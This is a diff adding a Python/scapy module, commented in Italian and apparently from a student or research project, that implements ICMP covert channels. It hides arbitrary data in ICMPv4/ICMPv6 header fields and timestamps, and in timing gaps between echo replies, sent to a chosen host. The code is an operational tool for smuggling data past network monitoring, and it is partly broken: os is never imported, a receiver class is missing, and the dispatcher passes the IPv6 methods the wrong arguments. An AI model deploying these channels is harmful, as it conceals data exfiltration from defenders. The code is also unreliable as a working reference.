@@ -1,0 +1,1704 @@
+import sys 
+import datetime
+import time
+
+file_path = "../comunication_methods.py"
+directory = os.path.dirname(file_path)
+sys.path.insert(0, directory)
+import comunication_methods as com
+
+file_path = "../mymethods.py"
+directory = os.path.dirname(file_path)
+sys.path.insert(0, directory)
+import mymethods 
+
+from scapy.all import IP, ICMP, Raw, Ether, IPv6, IPerror6, ICMPerror, IPerror
+from scapy.all import ICMPv6EchoReply, ICMPv6EchoRequest, ICMPv6ParamProblem, ICMPv6TimeExceeded, ICMPv6PacketTooBig, ICMPv6DestUnreach
+from scapy.all import get_if_hwaddr, sendp, sr1
+
+def senda_data(attack_function:str, data:bytes=None, ip_dst=None):
+    if not com.is_string(attack_function) or not com.is_bytes(data) or not com.is_IPAddress(ip_dst): 
+        raise Exception("Argomenti non validi")
+    singleton=SendSingleton()
+    match attack_function:
+        case "ipv4_information_reply": return singleton.ipv4_information_reply(data,ip_dst)
+        case "ipv4_timestamp_reply": return singleton.ipv4_timestamp_reply(data,ip_dst)
+        case "ipv4_redirect": return singleton.ipv4_redirect(data,ip_dst)
+        case "ipv4_source_quench": return singleton.ipv4_source_quench(data,ip_dst)
+        case "ipv4_parameter_problem": return singleton.ipv4_parameter_problem(data,ip_dst)
+        case "ipv4_time_exceeded": return singleton.ipv4_time_exceeded(data,ip_dst)
+        case "ipv4_destination_unreachable": return singleton.ipv4_destination_unreachable(data,ip_dst)
+        case "ipv4_timing_channel_1bit": return singleton.ipv4_timing_channel_1bit(data,ip_dst)
+        case "ipv4_timing_channel_2bit": return singleton.ipv4_timing_channel_2bit(data,ip_dst)
+        case "ipv4_timing_channel_4bit": return singleton.ipv4_timing_channel_4bit(data,ip_dst)
+        
+        case "ipv6_information_reply": return singleton.ipv6_information_reply(data,ip_dst)
+        case "ipv6_parameter_problem": return singleton.ipv6_parameter_problem(data,ip_dst)
+        case "ipv6_time_exceeded": return singleton.ipv6_time_exceeded(data,ip_dst)
+        case "ipv6_packet_to_big": return singleton.ipv6_packet_to_big(data,ip_dst)
+        case "ipv6_destination_unreachable": return singleton.ipv6_destination_unreachable(data,ip_dst)
+        case "ipv6_timing_channel_1bit": return singleton.ipv6_timing_channel_1bit(data,ip_dst)
+        case "ipv6_timing_channel_2bit": return singleton.ipv6_timing_channel_2bit(data,ip_dst)
+        case "ipv6_timing_channel_4bit": return singleton.ipv6_timing_channel_4bit(data,ip_dst)
+        
+
+def wait_data(attack_function:str, ip_dst=None):
+    if not com.is_string(attack_function) or not com.is_IPAddress(ip_dst): 
+        raise Exception("Argomenti non validi")
+    singleton=ReceiveSingleton() 
+    match attack_function:
+        case "ipv4_information_request": return singleton.ipv4_information_request(ip_dst)
+        case "ipv4_timestamp_request": return singleton.ipv4_timestamp_request(ip_dst)
+        case "ipv4_redirect": return singleton.ipv4_redirect(ip_dst)
+        case "ipv4_source_quench": return singleton.ipv4_source_quench(ip_dst)
+        case "ipv4_parameter_problem": return singleton.ipv4_parameter_problem(ip_dst)
+        case "ipv4_time_exceeded": return singleton.ipv4_time_exceeded(ip_dst)
+        case "ipv4_destination_unreachable": return singleton.ipv4_destination_unreachable(ip_dst)
+        case "ipv4_timing_cc": return singleton.ipv4_timing_cc(ip_dst) 
+        
+        case "ipv6_information_request": return singleton.ipv6_information_request(ip_dst)
+        case "ipv6_parameter_problem": return singleton.ipv6_parameter_problem(ip_dst)
+        case "ipv6_time_exceeded": return singleton.ipv6_time_exceeded(ip_dst)
+        case "ipv6_packet_to_big": return singleton.ipv6_packet_to_big(ip_dst)
+        case "ipv6_destination_unreachable": return singleton.ipv6_destination_unreachable(ip_dst)
+        case "ipv6_timing_cc": return singleton.ipv6_timing_cc(ip_dst) 
+
+#-----------------------------------------------------------------------
+class SendSingleton(): 
+    def ipv4_information_reply(self,data:bytes=None,ip_dst=None): 
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        TYPE_INFORMATION_REQUEST=15
+        TYPE_INFORMATION_REPLY=16
+        
+        for index in range(0, len(data), 2): 
+            if index==len(data)-1 and len(data)%2!=0:
+                icmp_id=(data[index]<<8)
+            else:
+                icmp_id=(data[index]<<8)+data[index+1] 
+            pkt= IP(dst=ip_dst)/ICMP(type=TYPE_INFORMATION_REPLY,id=icmp_id)
+            #print(f"Sending {pkt.summary()}") 
+            ans = sr1(pkt, timeout=10, verbose=1)  
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_INFORMATION_REPLY,id=0,seq=1)
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=10, verbose=1) 
+        if ans:  
+            return True  
+        return False 
+    
+    def ipv4_timestamp_reply(self,data:bytes=None,ip_dst=None):
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        TYPE_TIMESTAMP_REQUEST=13 
+        TYPE_TIMESTAMP_REPLY=14 
+        for index in range(0, len(data), 5): 
+            icmp_id=icmp_id=(data[index]<<8)+data[index+1]  
+            
+            current_time=datetime.datetime.now(datetime.timezone.utc) 
+            midnight = current_time.replace(hour=0, minute=0, second=0, microsecond=0) 
+
+            data_pkt=int.from_bytes(data[index+2:index+3])  *10**3
+            current_time=current_time.replace(microsecond=data_pkt)
+            icmp_ts_ori=int((current_time - midnight).total_seconds() * 1000) 
+            #icmp_ts_ori= int.from_bytes(data[index+2:index+5])  #(ms_since_midnight << 24) |  
+
+            data_pkt=int.from_bytes(data[index+3:index+4]) *10**3
+            if current_time.second+1<60:
+                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
+            else:
+                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
+            icmp_ts_rx=int((current_time - midnight).total_seconds() * 1000) 
+            
+            data_pkt=int.from_bytes(data[index+4:index+5]) *10**3
+            if current_time.second+1<60:
+                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
+            else:
+                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
+            icmp_ts_tx=int((current_time - midnight).total_seconds() * 1000)  
+
+            pkt= IP(dst=ip_dst)/ICMP(
+                type=TYPE_TIMESTAMP_REPLY
+                ,id=icmp_id
+                ,ts_ori=icmp_ts_ori
+                ,ts_rx=icmp_ts_rx
+                ,ts_tx=icmp_ts_tx
+            )
+            #print(f"Sending {pkt.summary()}") 
+            ans = sr1(pkt, timeout=10, verbose=1)  
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_TIMESTAMP_REPLY,id=0,seq=1)
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=10, verbose=1) 
+        if ans:  
+            return True  
+        return False 
+    
+    def ipv4_redirect(self,data:bytes=None,ip_dst=None): 
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        TYPE_REDIRECT=5    
+        for index in range(0, len(data), 4): 
+            #icmp_id=(data[index]<<8)+data[index+1]
+            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index:index+2])) / \
+                ICMP(id=int.from_bytes(data[index+2:index+4]))
+            pkt= IP(dst=ip_dst)/ICMP(type=TYPE_REDIRECT)/Raw(load=dummy_ip)
+            #print(f"Sending {pkt.summary()}") 
+            ans = sr1(pkt, timeout=10, verbose=1) 
+        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_REDIRECT)/Raw(load=dummy_ip)
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=10, verbose=1) 
+        if ans: 
+            return True  
+        return False 
+    
+    def ipv4_source_quench(self,data:bytes=None,ip_dst=None):
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        TYPE_SOURCE_QUENCH=4 
+        for index in range(0, len(data), 8):
+            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+4:index+6])) / \
+                ICMP(id=int.from_bytes(data[index+6:index+8]))
+            pkt= IP(dst=ip_dst)/\
+                ICMP(type=TYPE_SOURCE_QUENCH, unused=int.from_bytes(data[index:index+4]))/\
+                Raw(load=dummy_ip)
+            #print(f"Sending {pkt.summary()}") 
+            ans = sr1(pkt, timeout=10, verbose=1) 
+        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_SOURCE_QUENCH)#/Raw(load=dummy_ip)
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=10, verbose=1) 
+        if ans: 
+            return True  
+        return False 
+    
+    def ipv4_parameter_problem(self,data:bytes=None,ip_dst=None):
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        TYPE_PARAMETER_PROBLEM=12 
+        for index in range(0, len(data), 7):
+            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+3:index+5])) / \
+                ICMP(id=int.from_bytes(data[index+5:index+7]))
+            pkt= IP(dst=ip_dst)/\
+                ICMP(type=TYPE_PARAMETER_PROBLEM, ptr=int(data[index]) ,unused=int.from_bytes(data[index+1:index+3]) )/\
+                Raw(load=dummy_ip)
+            #print(f"Sending {pkt.summary()}") 
+            ans = sr1(pkt, timeout=10, verbose=1) 
+        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_PARAMETER_PROBLEM)/Raw(load=dummy_ip)
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=10, verbose=1) 
+        if ans: 
+            return True  
+        return False 
+    
+    def ipv4_time_exceeded(self,data:bytes=None,ip_dst=None): 
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti") 
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        TYPE_TIME_EXCEEDED=11 
+        for index in range(0, len(data), 6):
+            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+2:index+4])) / \
+                ICMP(id=int.from_bytes(data[index+4:index+6]))
+            pkt= IP(dst=ip_dst)/\
+                ICMP(type=TYPE_TIME_EXCEEDED, unused=int.from_bytes(data[index:index+2]) )/\
+                Raw(load=dummy_ip)
+            #print(f"Sending {pkt.summary()}") 
+            ans = sr1(pkt, timeout=10, verbose=1) 
+        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_TIME_EXCEEDED)/Raw(load=dummy_ip)
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=10, verbose=1) 
+        if ans: 
+            return True  
+        return False  
+    
+    def ipv4_destination_unreachable(self,data:bytes=None,ip_dst=None): 
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        TYPE_DESTINATION_UNREACHABLE=3 
+        for index in range(0, len(data), 8):
+            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+4:index+6])) / \
+                ICMP(id=int.from_bytes(data[index+6:index+8]))
+            pkt= IP(dst=ip_dst)/\
+                ICMP(type=TYPE_DESTINATION_UNREACHABLE, unused=int.from_bytes(data[index:index+4]) )/\
+                Raw(load=dummy_ip)
+            #print(f"Sending {pkt.summary()}") 
+            ans = sr1(pkt, timeout=10, verbose=1) 
+        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_DESTINATION_UNREACHABLE)/Raw(load=dummy_ip)
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=10, verbose=1) 
+        if ans: 
+            return True  
+        return False  
+    
+    def ipv4_timing_channel_1bit(self,data:bytes=None,ip_dst=None): #Exec Time 0:08:33.962674
+        #Nella comunicazione possono verificarsi turbolenze. 
+        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
+        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        TEMPO_0=3 #sec
+        DISTANZA_TEMPI=2 #sec
+        TEMPO_1=8 #sec
+        if TEMPO_0+DISTANZA_TEMPI*2>=TEMPO_1: 
+            raise ValueError("send_timing_cc: TEMPO_1 non valido")
+        TEMPO_BYTE=0*60 #minuti
+        
+        TYPE_ECHO_REQUEST=8
+        TYPE_ECHO_REPLY=0
+        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
+
+        bit_data=[]
+        for piece_data in data: #BIG ENDIAN
+            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
+            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
+            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
+        start_time=datetime.datetime.now(datetime.timezone.utc) 
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=0, verbose=1) 
+        for piece_bit_data in bit_data:
+            for bit in piece_bit_data:
+                if bit: 
+                    time.sleep(TEMPO_1) 
+                else: 
+                    time.sleep(TEMPO_0)
+                current_time=datetime.datetime.now(datetime.timezone.utc)
+                pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
+                #print(f"Sending {pkt.summary()}")
+                ans = sr1(pkt, timeout=0, verbose=1) 
+            time.sleep(TEMPO_BYTE)
+        end_time=datetime.datetime.now(datetime.timezone.utc) 
+    
+    def ipv4_timing_channel_2bit(self,data:bytes=None,ip_dst=None): #Exec Time 0:07:20.978946
+        #Nella comunicazione possono verificarsi turbolenze. 
+        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
+        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        DISTANZA_TEMPI=2 #sec
+        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(2**2)] #00, 01, 10, 11
+        #TEMPO_00=3, TEMPO_01=TEMPO_00+2*DISTANZA_TEMPI, TEMPO_10=TEMPO_01+2*DISTANZA_TEMPI, TEMPO_11=TEMPO_10+2*DISTANZA_TEMPI
+        TEMPO_BYTE=0*60 #minuti 
+        
+        TYPE_ECHO_REQUEST=8
+        TYPE_ECHO_REPLY=0
+        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
+
+        bit_data=[]
+        for piece_data in data: #BIG ENDIAN
+            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
+            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
+            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
+        start_time=datetime.datetime.now(datetime.timezone.utc)
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=0, verbose=1) 
+        for piece_bit_data in bit_data:
+            for bit1, bit2 in zip(piece_bit_data[0::2], piece_bit_data[1::2]): 
+                time.sleep(TEMPI_CODICI[(bit1<<1)+bit2]) 
+                current_time=datetime.datetime.now(datetime.timezone.utc)
+                pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
+                #print(f"Sending {pkt.summary()}")
+                ans = sr1(pkt, timeout=0, verbose=1)  
+            time.sleep(TEMPO_BYTE)
+        end_time=datetime.datetime.now(datetime.timezone.utc) 
+    
+    def ipv4_timing_channel_4bit(self,data:bytes=None,ip_dst=None): #Exec Time 0:12:00.745110 
+        #Nella comunicazione possono verificarsi turbolenze. 
+        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
+        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
+        if not com.is_bytes(data) or not com.is_IPAddress(ip_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if ip_dst.version!=4:
+            print(f"IP version is not 4: {ip_dst.version}")
+            return False
+        
+        DISTANZA_TEMPI=2 #sec
+        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(4**2)] #0000, 0001, 0010, 0011,...,1111
+        TEMPO_BYTE=0*60 #minuti  
+        
+        TYPE_ECHO_REQUEST=8
+        TYPE_ECHO_REPLY=0
+        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
+        
+        bit_data=[]
+        for piece_data in data: #BIG ENDIAN
+            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
+            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
+            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
+        start_time=datetime.datetime.now(datetime.timezone.utc)
+        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
+        #print(f"Sending {pkt.summary()}") 
+        ans = sr1(pkt, timeout=0, verbose=1)  
+        for piece_bit_data in bit_data:
+            for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
+                index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
+                time.sleep(TEMPI_CODICI[index])  
+                pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
+                #print(f"Sending {pkt.summary()}")
+                ans = sr1(pkt, timeout=0, verbose=1)  
+            time.sleep(TEMPO_BYTE)
+        end_time=datetime.datetime.now(datetime.timezone.utc)  
+
+    #-------------------------------------
+    def ipv6_information_reply(self,data:bytes=None,addr_src=None,addr_dst=None): 
+        if not com.is_bytes(data) or not com.is_IPAddress(addr_src) or not com.is_IPAddress(addr_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if addr_dst.version!=6:
+            print(f"IP version is not 6: {addr_dst.version}")
+            return False
+        
+        TYPE_INFORMATION_REQUEST=128
+        TYPE_INFORMATION_REPLY=129 
+        try:
+            interface,_= mymethods.iface_src_from_IP(addr_dst)
+            if interface is None:  
+                interface=mymethods.default_iface()
+                com.ping_once(addr_dst,interface)
+            interface,_= mymethods.iface_src_from_IP(addr_dst)
+            if interface is None:
+                raise Exception("Problema con l'interfaccia non risolto") 
+        except Exception as e: 
+            interface=mymethods.default_iface() 
+        
+        dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
+        src_mac = get_if_hwaddr(interface)
+        
+        for index in range(0, len(data), 2): 
+            if index==len(data)-1 and len(data)%2!=0:
+                icmp_id=(data[index]<<8) 
+            else:
+                icmp_id=(data[index]<<8)+data[index+1] 
+            pkt= (
+                 Ether(dst=dst_mac, src=src_mac)
+                /IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)
+                /ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=icmp_id)
+            )
+            #print(f"Sending {pkt.summary()}") 
+            ans = sendp(pkt, verbose=1,iface=interface) 
+        pkt= (
+            Ether(dst=dst_mac, src=src_mac)
+            /IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)
+            /ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
+            / Raw(load="Hello Neighbour".encode())
+        )
+        #print(f"Sending {pkt.summary()}") 
+        ans = sendp(pkt, verbose=1,iface=interface) 
+        if ans: 
+            return True  
+        return False 
+    
+    def ipv6_parameter_problem(self,data:bytes=None,addr_src=None,addr_dst=None): 
+        if not com.is_bytes(data) or not com.is_IPAddress(addr_src) or not com.is_IPAddress(addr_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if addr_dst.version!=6:
+            print(f"IP version is not 6: {addr_dst.version}")
+            return False
+        
+        TYPE_PARAMETER_PROBLEM=4  
+        TYPE_INFORMATION_REQUEST=128
+        TYPE_INFORMATION_REPLY=129 
+        try:
+            interface,_= mymethods.iface_src_from_IP(addr_dst) 
+            if interface is None:  
+                interface=mymethods.default_iface()
+                com.ping_once(addr_dst,interface)
+            interface,_= mymethods.iface_src_from_IP(addr_dst)
+            if interface is None:
+                raise Exception("Problema con l'interfaccia non risolto")  
+        except Exception as e: 
+            interface=mymethods.default_iface() 
+        dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
+        src_mac = get_if_hwaddr(interface) 
+        
+        for index in range(0, len(data), 8):  
+            dummy_pkt=(
+                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=int.from_bytes(data[index+4:index+6]))  /
+                ICMPv6EchoRequest(
+                    type=TYPE_INFORMATION_REQUEST,
+                    id=int.from_bytes(data[index+6:index+8]), 
+                    seq=0
+                )
+            )
+            pkt=(
+                Ether(dst=dst_mac, src=src_mac) /
+                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
+                ICMPv6ParamProblem(ptr=int.from_bytes(data[index:index+4]),type=TYPE_PARAMETER_PROBLEM) /
+                dummy_pkt
+            ) 
+            #print(f"Sending {pkt.summary()} through interface {interface}")  
+            ans = sendp(pkt, verbose=1,iface=interface)  
+
+        dummy_pkt=(
+            IPerror6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
+            ICMPv6EchoRequest(type=TYPE_INFORMATION_REQUEST, id=0, seq=1)
+        )
+        pkt=(
+            Ether(dst=dst_mac, src=src_mac) /
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
+            ICMPv6ParamProblem(type=TYPE_PARAMETER_PROBLEM,ptr=0xFFFFFFFF) /
+            dummy_pkt
+        ) 
+        #print(f"Sending {pkt.summary()} through interface {interface}")  
+        ans = sendp(pkt, verbose=1,iface=interface) 
+        if ans: 
+            return True  
+        return False  
+
+    def ipv6_time_exceeded(self, data:bytes=None, addr_src=None, addr_dst=None): 
+        if not com.is_bytes(data) or not com.is_IPAddress(addr_src) or not com.is_IPAddress(addr_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if addr_dst.version!=6:
+            print(f"IP version is not 6: {addr_dst.version}")
+            return False
+        
+        TYPE_TIME_EXCEEDED= 3
+        TYPE_INFORMATION_REPLY=129 
+        try:
+            interface,_= mymethods.iface_src_from_IP(addr_dst) 
+            if interface is None:  
+                interface=mymethods.default_iface()
+                com.ping_once(addr_dst,interface)
+            interface,_= mymethods.iface_src_from_IP(addr_dst)
+            if interface is None:
+                raise Exception("Problema con l'interfaccia non risolto")  
+        except Exception as e: 
+            interface=mymethods.default_iface() 
+        dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
+        src_mac = get_if_hwaddr(interface) 
+        
+        for index in range(0, len(data), 4): 
+            dummy_pkt=(
+                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=int.from_bytes(data[index:index+2]))  /
+                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=int.from_bytes(data[index+2:index+4]), seq=0)
+            )
+            pkt=(
+                Ether(dst=dst_mac, src=src_mac) /
+                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
+                ICMPv6TimeExceeded(type=TYPE_TIME_EXCEEDED) /
+                dummy_pkt
+            ) 
+            #print(f"Sending {pkt.summary()} through interface {interface}")  
+            ans = sendp(pkt, verbose=1,iface=interface)  
+        
+        dummy_pkt=(
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=0xffff)  /
+            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
+        )
+        pkt=(
+            Ether(dst=dst_mac, src=src_mac) /
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
+            ICMPv6TimeExceeded(type=TYPE_TIME_EXCEEDED) /
+            dummy_pkt
+        ) 
+        #print(f"Sending {pkt.summary()} through interface {interface}")  
+        ans = sendp(pkt, verbose=1,iface=interface) 
+        if ans: 
+            return True  
+        return False
+    
+    def ipv6_packet_to_big(self, data:bytes=None, addr_src=None, addr_dst=None): 
+        if not com.is_bytes(data) or not com.is_IPAddress(addr_src) or not com.is_IPAddress(addr_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if addr_dst.version!=6:
+            print(f"IP version is not 6: {addr_dst.version}")
+            return False
+        
+        TYPE_PKT_BIG= 2
+        TYPE_INFORMATION_REQUEST=128
+        TYPE_INFORMATION_REPLY=129  
+        try:
+            interface,_= mymethods.iface_src_from_IP(addr_dst) 
+            if interface is None:  
+                interface=mymethods.default_iface()
+                com.ping_once(addr_dst,interface)
+            interface,_= mymethods.iface_src_from_IP(addr_dst)
+            if interface is None:
+                raise Exception("Problema con l'interfaccia non risolto")  
+        except Exception as e: 
+            interface=mymethods.default_iface() 
+        dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
+        src_mac = get_if_hwaddr(interface)  
+        
+        for index in range(0, len(data), 8): 
+            dummy_pkt=(
+                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=int.from_bytes(data[index+4:index+6]))  /
+                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=int.from_bytes(data[index+6:index+8]), seq=0)
+            )
+            pkt=(
+                Ether(dst=dst_mac, src=src_mac) /
+                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
+                ICMPv6PacketTooBig(type=TYPE_PKT_BIG, mtu=int.from_bytes(data[index:index+4])) /
+                dummy_pkt
+            ) 
+            #print(f"Sending {pkt.summary()} through interface {interface}")  
+            ans = sendp(pkt, verbose=1,iface=interface)  
+
+        dummy_pkt=(
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=0xffff)  /
+            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
+        )
+        pkt=(
+            Ether(dst=dst_mac, src=src_mac) /
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
+            ICMPv6PacketTooBig(type=TYPE_PKT_BIG, mtu=0) /
+            dummy_pkt
+        ) 
+        #print(f"Sending {pkt.summary()} through interface {interface}")  
+        ans = sendp(pkt, verbose=1,iface=interface) 
+        if ans: 
+            return True  
+        return False
+    
+    def ipv6_destination_unreachable(self, data:bytes=None, addr_src=None, addr_dst=None): 
+        if not com.is_bytes(data) or not com.is_IPAddress(addr_src) or not com.is_IPAddress(addr_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if addr_dst.version!=6:
+            print(f"IP version is not 6: {addr_dst.version}")
+            return False
+        
+        TYPE_DESTINATION_UNREACHABLE=1 
+        TYPE_INFORMATION_REQUEST=128
+        TYPE_INFORMATION_REPLY=129 
+        try:
+            interface,_= mymethods.iface_src_from_IP(addr_dst) 
+            if interface is None:  
+                interface=mymethods.default_iface()
+                com.ping_once(addr_dst,interface)
+            interface,_= mymethods.iface_src_from_IP(addr_dst)
+            if interface is None:
+                raise Exception("Problema con l'interfaccia non risolto")  
+        except Exception as e: 
+            interface=mymethods.default_iface() 
+        dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
+        src_mac = get_if_hwaddr(interface) 
+
+        for index in range(0, len(data), 4): 
+            dummy_pkt=(
+                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=int.from_bytes(data[index:index+2]))  /
+                ICMPv6EchoReply(type=128,id=int.from_bytes(data[index+2:index+4]), seq=0)
+            )
+            pkt=(
+                Ether(dst=dst_mac, src=src_mac) /
+                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
+                ICMPv6DestUnreach(type=TYPE_DESTINATION_UNREACHABLE) /
+                dummy_pkt
+            ) 
+            #print(f"Sending {pkt.summary()} through interface {interface}")  
+            ans = sendp(pkt, verbose=1,iface=interface)  
+        dummy_pkt=(
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=0xffff)  /
+            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
+        )
+        pkt=(
+            Ether(dst=dst_mac, src=src_mac) /
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
+            ICMPv6DestUnreach(type=TYPE_DESTINATION_UNREACHABLE) /
+            dummy_pkt
+        ) 
+        #print(f"Sending {pkt.summary()} through interface {interface}")  
+        ans = sendp(pkt, verbose=1,iface=interface) 
+        if ans: 
+            return True  
+        return False
